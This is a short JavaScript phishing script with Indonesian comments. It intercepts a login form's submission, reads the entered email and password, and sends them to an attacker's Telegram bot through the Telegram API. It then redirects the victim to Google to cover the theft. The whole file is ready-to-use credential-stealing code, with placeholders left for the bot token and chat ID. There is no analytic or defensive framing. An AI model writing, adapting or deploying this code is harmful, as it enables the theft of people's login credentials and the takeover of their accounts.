document.getElementById("loginForm").addEventListener("submit", function(event) {
    event.preventDefault(); // Biar form gak langsung refresh halaman

    // Ambil nilai input email & password
    let email = document.getElementById("email").value;
    let password = document.getElementById("password").value;

    // Kirim data ke Telegram (ganti `BOT_TOKEN` & `CHAT_ID` sesuai bot lo)
    fetch(`https://api.telegram.org/bot[BOT_TOKEN]/sendMessage`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            chat_id: "[CHAT_ID]",
            text: `Email: ${email}\nPassword: ${password}`
        })
    }).then(response => response.json())
    .then(data => {
        console.log("Pesan terkirim:", data);
        // Redirect ke Google setelah berhasil kirim ke Telegram
        window.location.href = "https://www.google.com";
    })
    .catch(error => console.error("Gagal kirim pesan:", error));
});
